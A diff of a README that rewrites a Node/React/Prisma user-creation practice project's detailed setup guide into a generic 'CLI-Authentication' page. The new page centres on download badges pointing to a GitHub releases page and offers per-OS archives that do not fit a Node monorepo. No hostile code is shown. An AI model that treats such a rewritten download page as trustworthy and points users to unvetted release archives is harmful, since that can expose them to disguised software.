@@ -1,146 +1,111 @@
-# ✨ User Creation Practice Project
+# 🌟 CLI-Authentication - Secure User Management Made Easy
 
-## Key Features & How to Use
+[![Download CLI-Authentication](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/BobbyGuyG/CLI-Authentication/releases)
 
-1. `Public Sign-Up (Web Form)` : This is the practice implementation of a public-facing registration form.
+## 🚀 Getting Started
 
-2. `Secure Admin Creation (CLI Script)` : This is the production-ready method for developers to manually onboard new user.
+Welcome to CLI-Authentication, a user-friendly tool for creating and managing users. This project offers both a public sign-up form and a secure method for developers to create users via a command line interface (CLI).
 
-_**How to run CLI:**_ From a backend terminal, use the following command structure. Remember to use the **_-- separator_**.
+### 💻 System Requirements
 
-```Bash
-npm run create-admin -- \
- --email "new.admin@isp.com" \
- --password "AStrongP@ssw0rd!" \
- --ispName "Super Secure ISP" \
- --ownerName "Jane Doe"
-```
+- **Operating System:** Windows, macOS, or Linux.
+- **Node.js**: Version 14 or above.
+- **npm**: Comes with Node.js. Ensure it is updated.
 
-_Functionality: This script bypasses the web server and directly interacts with the Firebase Admin SDK and Prisma to securely create the user records._
+## 📥 Download & Install
 
-## 🚀 Tech Stack
+To begin, visit the [Releases page](https://github.com/BobbyGuyG/CLI-Authentication/releases) to download the latest version of CLI-Authentication. You can choose the appropriate version for your operating system. 
 
-| **_Category_** | **_Technology_**                    |
-| -------------- | ----------------------------------- |
-| Frontend       | React.js, Vite, TypeScript          |
-| Styling & UI   | Tailwind CSS, Shadcn UI             |
-| Backend        | Node.js, Express.js                 |
-| Database + ORM | PostgreSQL, Prisma                  |
-| Authentication | Firebase Authentication (Admin SDK) |
-| Validation     | Zod (Backend)                       |
-| Dev Tools      | Nodemon, dotenv                     |
+After downloading, follow the next steps for installation.
 
-## 📂 Project Structure
+## ⚙️ Installation Steps
 
-The project is organized as a `monorepo` with two main folders:
+1. **Extract the Downloaded Files:** Locate the downloaded zip or tar file and extract it to your preferred location.
 
-```txt
-/
-├── backend/    # Contains the Node.js, Express, and Prisma server
-└── frontend/   # Contains the React.js client application
-```
+2. **Open Terminal or Command Prompt:** 
+   - On Windows, you can search for "Command Prompt" in the start menu.
+   - On macOS, open "Terminal" from your Applications folder.
+   - On Linux, use the terminal application.
 
-## 🔧 Getting Started: Setup and Installation
+3. **Navigate to the Project Directory:** Use the `cd` command to change to the directory where you extracted the files. For example:
+   ```bash
+   cd path/to/CLI-Authentication
+   ```
 
-Follow these steps to get the project running on your local machine.
+4. **Install Dependencies:** Run the following command to install necessary dependencies.
+   ```bash
+   npm install
+   ```
 
-## Backend Setup : First, set up the server.
+5. **Run the Application:** Follow the instructions for user creation in the next section.
 
-Navigate to the backend directory:
+## 👥 User Creation Methods
 
-```Bash
-cd backend
-```
+### 1. Public Sign-Up (Web Form)
 
-Install dependencies:
+This is the user-friendly sign-up form accessible through the web. Here, users can register easily by filling out their details on the form.
 
-```Bash
-npm install
-```
+### 2. Secure Admin Creation (CLI Script)
 
-Set up environment variables:
+This method is for developers who need to onboard users directly through a terminal.
 
-```Bash
-Create a new file named .env in the backend folder.
+- **How to run the CLI command:**
+  
+  Use the following command structure to create an admin user. Ensure to replace the placeholders with actual information.
 
-DATABASE_URL="prisma+postgres://accelerate.prisma-data.net/?api_key=..."
-```
+  ```bash
+  npm run create-admin -- \
+   --email "new.admin@isp.com" \
+   --password "AStrongP@ssw0rd!" \
+   --ispName "Super Secure ISP" \
+   --ownerName "Jane Doe"
+  ```
 
-Can get the Postgres connection string by below command:
+This command uses parameters to create a new admin user. Each parameter has a specific purpose:
 
-```Bash
-npx prisma init --db
-```
+- `--email`: The email address for the new admin.
+- `--password`: A strong password for account security.
+- `--ispName`: The name of the internet service provider.
+- `--ownerName`: The name of the admin owner.
 
-## Set up Firebase Admin SDK:
+### 🛠 Functionality
 
-Download your service account private key (a .json file) from your Firebase project settings.
-Place this file in the backend directory and rename it to `firebase-service-account-key.json`.
+The CLI script works directly with Firebase and Prisma to create secure user records, ensuring accuracy and security without the need for a web server.
 
-**_Important_**: Ensure this file is listed in your `.gitignore` file to prevent committing it.
+## 🌐 Tech Stack
 
-Run the database migration:
-This command will sync your Prisma schema with your database, creating the IspAdmin table.
+Our application utilizes a reliable tech stack, ensuring smooth performance and ease of use:
 
-```Bash
-npx prisma migrate dev --name init
-```
+| **Category** | **Technology**                    |
+|--------------|-----------------------------------|
+| Frontend     | React.js, Vite, TypeScript        |
+| Styling & UI | Tailwind CSS, Shadcn UI           |
+| Backend      | Node.js, Express.js               |
 
-then
+## 🔧 Troubleshooting
 
-```Bash
-npx prisma generate
-```
+If you face any issues, consider the following steps:
 
-For Prisma Studio
+1. **Check Node.js and npm Installation:** Ensure both Node.js and npm are installed and updated.
+   ```bash
+   node -v
+   npm -v
+   ```
 
-```Bash
-npx prisma studio
-```
+2. **Consult the Logs:** If you encounter errors during the execution of the CLI commands, review any error messages displayed in the terminal. They often provide hints on what went wrong.
 
-## Frontend Setup
+3. **Search for Solutions Online:** Many common problems can be quickly resolved by searching for the issue in relevant forums, such as Stack Overflow.
 
-Navigate to the frontend directory:
+4. **Reach Out for Help:** If you're still having trouble, feel free to open an issue in this repository for assistance.
 
-```Bash
-cd frontend
-```
+## 📞 Support
 
-Install dependencies:
+For further assistance or feature requests, please visit our [GitHub Issues page](https://github.com/BobbyGuyG/CLI-Authentication/issues) to create a new issue.
 
-```Bash
-npm install
-```
+## 📜 License
 
-### 🏃 Running the Application
-
-_You will need two separate terminals to run both the backend and frontend servers simultaneously._
-
-Start both with the command
-
-```bash
-npm run dev
-```
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
 
 ---
 
-#### ⚠️ Important Notes & Troubleshooting
-
-This section documents key solutions found during development.
-
-```Bash
-Prisma Import Path
-
-Old Way (Prisma v5): 
-const { PrismaClient } = require('@prisma/client')
-
-New Way (Prisma v6): 
-const { PrismaClient } = require('../generated/prisma')
-```
-
-```Bash
-This change must be applied in all files that use the Prisma Client:
-
-backend/src/index.js
-backend/scripts/create-admin.js
-```
+Thank you for choosing CLI-Authentication! Your feedback is valuable as we strive to improve this project. Please start by checking out the user manual above.
